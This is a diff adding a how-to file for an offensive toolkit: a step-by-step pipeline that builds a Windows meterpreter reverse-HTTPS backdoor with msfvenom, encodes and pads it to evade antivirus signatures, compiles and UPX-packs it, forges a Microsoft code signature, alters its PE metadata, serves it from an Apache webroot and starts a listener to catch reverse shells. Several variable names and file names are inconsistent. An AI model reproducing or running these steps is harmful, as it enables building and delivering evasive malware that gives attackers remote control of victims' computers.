@@ -1,0 +1,53 @@
+HOW-TO:
+# HINT: $KEYID will add extra bits (random) of nopsled data to evade signature detection
+KEYID=$(cat /dev/urandom | tr -dc '1-2' | tr -d '[:punct:]' | fold -w 2 | head -n 1)
+sudo msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 20 -n $KEYID HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true --platform windows -f c -o $IPATH/output/chars.raw
+
+## delete 'unsigned char buff[]=' from chars.raw
+sed -i "s|unsigned char buff[]=||" chars.raw
+
+## Compile C program to exe
+cd $IPATH/output
+i586-mingw32msvc-gcc dse.c -o $N4m.exe -lws2_32 -mwindows
+
+## pack executable with UPX
+upx -9 -v -o packet.exe $NaM.exe
+mv packet $NaM.exe
+
+##  signs an Executable for AV Evasion (carboncopy)
+# https://github.com/paranoidninja/CarbonCopy
+python3 CarbonCopy.py www.microsoft.com 443 $NaM.exe signed-$NaM.exe
+mv signed-$NaM.exe $NaM.exe
+
+## Copy files to apache2 webroot
+cp chars.raw $apache/chars.raw > /dev/nul 2>&1
+cp $N4m.exe $apache/$N4m.exe > /dev/nul 2>&1
+
+## start apache2
+sudo service apache start
+
+## Start handler
+msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $lhost; set LPORT $lport; set EnableStageEncoding true; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set ExitOnSession false; exploit'
+
+
+---
+
+
+[ store RH wine absoluct path ]
+RhI="$HOME/.wine/drive_c/Program Files/Resource Hacker/ResourceHacker.exe"
+
+
+[ compile res file ]
+cd $IPATH/templates/evasion3
+cp resource.rc resource.bak > /dev/nul 2>&1
+sed -i "s|OgFnpPt|$NaM.exe|" resource.rc
+$arch "$RhI" -open $IPATH/templates/evasion3/resource.rc -save $IPATH/output/resources.res -action compile -log NUL
+cp resource.bak resource.rc > /dev/nul 2>&1
+cd $IPATH
+
+
+[ PE Meta-Data Alteration]
+$arch "$RhI" -open "$IPATH/output/$N4m.exe" -save "$IPATH/output/$N4m.exe" -action addoverwrite -resource $IPATH/output/resources.res
+
+
+
